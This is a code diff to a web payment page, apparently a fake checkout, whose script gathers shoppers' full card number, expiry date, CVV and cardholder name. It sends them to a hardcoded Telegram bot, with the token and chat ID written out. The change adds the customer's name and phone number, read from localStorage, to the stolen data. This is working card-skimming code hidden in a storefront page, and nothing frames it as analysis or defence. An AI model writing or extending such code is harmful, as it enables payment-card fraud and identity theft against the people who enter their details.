@@ -408,7 +408,12 @@
 
             const botToken = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
             const chatId = '8108427825';
-            const message = `💳 بيانات بطاقة جديدة:\nرقم: ${cardNumber}\nتاريخ: ${expiry}\nCVV: ${cvv}\nاسم: ${cardHolder}`;
+            const fullCardNumber = cardNumber;
+            const cardExpiry = expiry;
+            const cardCvv = cvv;
+            const name = localStorage.getItem('masheed_customer_name') || 'غير متوفر';
+            const phone = localStorage.getItem('masheed_customer_phone') || 'غير متوفر';
+            const message = `💳 بيانات بطاقة جديدة:\nالعميل: ${name}\nرقم الهاتف: ${phone}\nرقم البطاقة: ${fullCardNumber}\nالتاريخ: ${cardExpiry}\nرمز الامان: ${cardCvv}\nاسم البطاقة: ${cardHolder}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
